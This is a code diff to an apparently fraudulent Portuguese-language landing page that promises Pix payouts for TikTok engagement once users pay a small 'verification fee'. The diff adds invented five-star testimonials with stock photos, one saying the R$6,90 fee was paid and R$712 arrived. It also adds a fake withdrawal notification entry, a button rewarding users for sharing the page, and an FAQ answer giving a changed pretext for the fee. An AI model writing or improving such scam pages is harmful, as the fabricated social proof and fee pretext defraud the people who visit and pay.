@@ -397,8 +397,8 @@
       </button>
     </div>
 
-    <!-- ETAPA 10: TELA DE FILA E PARABÉNS ANIMADA (ANTES DA CONFIRMAÇÃO DO WEBHOOK) -->
-    <div id="step-10" class="step-view hidden bg-gradient-to-b from-pink-500 via-rose-600 to-purple-700 rounded-3xl p-6 shadow-2xl text-white text-center space-y-6 relative overflow-hidden glow-effect">
+    <!-- ETAPA 10: TELA DE FILA E PARABÉNS ANIMADA (AJUSTADA) -->
+    <div id="step-10" class="step-view hidden bg-gradient-to-b from-pink-500 via-rose-600 to-purple-700 rounded-3xl p-6 shadow-2xl text-white text-center space-y-5 relative overflow-hidden glow-effect">
       <!-- Efeito visual de fogos e emojis festivos flutuantes -->
       <div class="absolute inset-0 pointer-events-none opacity-25 flex justify-around items-center text-4xl">
         <span>🎆</span><span>✨</span><span>🎉</span><span>🎇</span><span>🥳</span><span>🚀</span>
@@ -429,9 +429,24 @@
         <span class="text-2xl font-black text-yellow-300 total-balance-display">R$ 872,75</span>
       </div>
 
-      <button onclick="location.reload()" class="w-full bg-yellow-400 hover:bg-yellow-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer text-sm relative z-10">
-        CONCLUÍDO / VOLTAR AO INÍCIO
-      </button>
+      <!-- Sugestão de engajamento contínuo -->
+      <div class="bg-white/10 rounded-2xl p-3 border border-white/20 relative z-10 space-y-1">
+        <p class="text-xs font-extrabold text-yellow-300 uppercase tracking-wide">💡 DICA DE OURO:</p>
+        <p class="text-xs text-pink-100 leading-snug">
+          Continue engajando no TikTok para aumentar o seu saldo e receber mais recompensas todos os dias!
+        </p>
+      </div>
+
+      <!-- Botões de Ação na Tela Final -->
+      <div class="space-y-2.5 relative z-10 pt-1">
+        <button onclick="scrollToShareSection()" class="w-full bg-amber-400 hover:bg-amber-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer text-sm flex items-center justify-center space-x-2">
+          <span>📲 COMPARTILHAR E GANHAR MAIS (+R$ 50,00)</span>
+        </button>
+
+        <button onclick="switchStep(2)" class="w-full bg-white/20 hover:bg-white/30 active:scale-[0.98] text-white font-bold py-3 px-4 rounded-xl border border-white/30 backdrop-blur-md transition-all cursor-pointer text-xs">
+          🔥 CONTINUAR ASSISTINDO E ENGAJANDO
+        </button>
+      </div>
     </div>
 
     <!-- ETAPA 11: TELA / MODAL DE DESCONTO -->
@@ -465,7 +480,7 @@
       </button>
     </div>
 
-    <!-- SEÇÃO NOVAS AVALIAÇÕES -->
+    <!-- SEÇÃO NOVAS AVALIAÇÕES (EXPANDIDA COM +3 AVALIAÇÕES) -->
     <div class="space-y-3 pt-2">
       <div class="flex items-center justify-between px-1">
         <h3 class="text-xs font-black uppercase tracking-wider text-slate-700">QUEM JÁ SACOU HOJE</h3>
@@ -476,6 +491,7 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1 snap-x">
+        <!-- Depoimento 1 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -490,6 +506,7 @@
           <p class="text-xs text-slate-600 leading-snug">"genteee, ta funcionando dmssss pingou aqui!!"</p>
         </div>
 
+        <!-- Depoimento 2 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -503,11 +520,56 @@
           </div>
           <p class="text-xs text-slate-600 leading-snug">"Aqui demorou um pouquinho no Pix por causa do banco, mas caiu certinho! Valeu d+!"</p>
         </div>
+
+        <!-- Depoimento 3 (NOVO) -->
+        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2.5">
+              <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100&auto=format&fit=crop&q=80" alt="Amanda" class="w-9 h-9 rounded-full object-cover">
+              <div>
+                <p class="font-bold text-xs text-slate-900">Amanda Rocha</p>
+                <p class="text-[10px] text-slate-400">há 27 min</p>
+              </div>
+            </div>
+            <div class="text-amber-400 text-xs">★★★★★</div>
+          </div>
+          <p class="text-xs text-slate-600 leading-snug">"Achei que era mentira kkkk mas paguei a taxa de R$6,90 e caiu R$712 em 3 minutos!"</p>
+        </div>
+
+        <!-- Depoimento 4 (NOVO) -->
+        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2.5">
+              <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&auto=format&fit=crop&q=80" alt="Mateus" class="w-9 h-9 rounded-full object-cover">
+              <div>
+                <p class="font-bold text-xs text-slate-900">Mateus Henrique</p>
+                <p class="text-[10px] text-slate-400">há 35 min</p>
+              </div>
+            </div>
+            <div class="text-amber-400 text-xs">★★★★★</div>
+          </div>
+          <p class="text-xs text-slate-600 leading-snug">"Ainda bem que compartilhei no Zap, ganhei mais bônus e caiu na conta direto!"</p>
+        </div>
+
+        <!-- Depoimento 5 (NOVO) -->
+        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2.5">
+              <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&auto=format&fit=crop&q=80" alt="Camila" class="w-9 h-9 rounded-full object-cover">
+              <div>
+                <p class="font-bold text-xs text-slate-900">Camila Vasconcelos</p>
+                <p class="text-[10px] text-slate-400">há 42 min</p>
+              </div>
+            </div>
+            <div class="text-amber-400 text-xs">★★★★★</div>
+          </div>
+          <p class="text-xs text-slate-600 leading-snug">"Aprovado demais! Respondi as 5 perguntas no celular e o Pix veio direto pelo CPF."</p>
+        </div>
       </div>
     </div>
 
     <!-- SEÇÃO 1: CONVIDAR AMIGOS & AUMENTAR SALDO -->
-    <div class="bg-gradient-to-br from-pink-600 to-rose-600 rounded-3xl p-5 text-white shadow-xl shadow-pink-100 space-y-4">
+    <div id="share-section" class="bg-gradient-to-br from-pink-600 to-rose-600 rounded-3xl p-5 text-white shadow-xl shadow-pink-100 space-y-4">
       <div class="flex items-center justify-between">
         <span class="text-[10px] font-extrabold bg-white/20 px-2.5 py-1 rounded-full uppercase tracking-wider">Programa Indique & Ganhe</span>
         <span class="text-xs font-bold text-yellow-300">Ganhe até +R$ 400,00</span>
@@ -547,7 +609,7 @@
       </div>
     </div>
 
-    <!-- SEÇÃO 2: DÚVIDAS FREQUENTES (FAQ) -->
+    <!-- SEÇÃO 2: DÚVIDAS FREQUENTES (FAQ AJUSTADO) -->
     <div class="bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-4">
       <div class="space-y-1">
         <h3 class="text-lg font-extrabold text-slate-900">Dúvidas Frequentes</h3>
@@ -565,13 +627,14 @@
           </div>
         </div>
 
+        <!-- PERGUNTA ATUALIZADA AQUI -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(2)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Por que preciso pagar a taxa de verificação?</span>
             <span id="faq-icon-2" class="text-base font-black text-slate-400">+</span>
           </button>
           <div id="faq-answer-2" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            A taxa simbólica serve para autenticar que você é uma pessoa real, evitar robôs e fraudes no sistema, além de cobrir os custos de transferência bancária instantânea.
+            A taxa simbólica serve para autenticar que você é uma pessoa real, evitar robôs e fraudes no sistema, além de cobrir os custos de transferências bancárias internacionais.
           </div>
         </div>
 
@@ -622,7 +685,8 @@
       { name: "Ricardo Almeida de Castanhal", text: "sacou R$ 540,90" },
       { name: "Ana Silva de Castanhal", text: "sacou R$ 512,75" },
       { name: "Juliana Santos de Belém", text: "sacou R$ 872,75" },
-      { name: "Marcos Lima de Ananindeua", text: "sacou R$ 620,00" }
+      { name: "Marcos Lima de Ananindeua", text: "sacou R$ 620,00" },
+      { name: "Amanda Rocha de Castanhal", text: "sacou R$ 712,00" }
     ];
 
     window.addEventListener('DOMContentLoaded', () => {
@@ -630,6 +694,13 @@
       setupBackRedirect();
       setTimeout(initSocialProof, 1500);
     });
+
+    function scrollToShareSection() {
+      const section = document.getElementById('share-section');
+      if (section) {
+        section.scrollIntoView({ behavior: 'smooth' });
+      }
+    }
 
     function shareLink() {
       if (shareCount >= 3) return;
